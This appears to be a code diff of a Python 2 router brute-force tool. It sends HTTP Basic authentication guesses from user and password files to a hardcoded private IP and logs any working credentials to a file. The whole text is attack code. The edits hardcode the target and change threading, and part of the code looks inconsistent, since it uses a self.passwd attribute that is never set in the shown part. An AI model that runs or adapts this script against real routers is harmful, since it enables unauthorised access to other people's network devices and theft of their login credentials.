@@ -18,7 +18,9 @@ class Rout_thread(threading.Thread):
 
         self.passwordlist=passwd
 
-    def run(self):
+        return
+
+    def start(self):
 
         self.user=queue.get()
 
@@ -27,41 +29,42 @@ class Rout_thread(threading.Thread):
             request = urllib2.Request("http://"+target)
 
             psw_base64 = "Basic " + base64.b64encode(self.user + ":" + self.passwd)
-
+            #print psw_base64
             request.add_header('Authorization', psw_base64)
 
-        try:
 
-            response = urllib2.urlopen(request)
+            try:
+                response = urllib2.urlopen(request)
+                print response.geturl()
 
-            print "[+]Correct! Username: %s, password: %s" % (self.user,self.passwd)
+                print "[+]Correct! Username: %s, password: %s" % (self.user,self.passwd)
 
-            fp3 = open('log.txt','a')
+                fp3 = open('log.txt','a')
 
-            fp3.write(self.user+'||'+self.passwd+'\r\n')
+                fp3.write(self.user+'||'+self.passwd+'\r\n')
 
-            fp3.close()
+                fp3.close()
 
-        except urllib2.HTTPError:
+            except urllib2.HTTPError:
 
-            print "[-]password:%s Error!" % (self.passwd)
+                print "[-]password:%s Error!" % (self.passwd)
 
 if __name__ == '__main__':
 
     print ("#######################################################")
     print ("#                Routing brute force tool             #")
-    print ("#                by:yinke                             #")
     print ("#######################################################")
 
     passwordlist = []
 
-    line = 20
+    line = 2500
 
     threads = []
 
     global target
 
-    target = raw_input("input ip:")
+    #target = raw_input("input ip:")
+    target = "10.149.58.113"
 
     fp =open("user.txt")
 
@@ -75,14 +78,14 @@ if __name__ == '__main__':
 
         passwordlist.append(passwd.split('\n')[0])
 
-    #print passwordlist
-
+    print passwordlist
 
     fp.close()
 
     fp2.close()
 
-    for i in range(line):
+    #for i in range(line):
+    for i in range(len(passwordlist)):
 
         a = Rout_thread(queue,passwordlist)
 
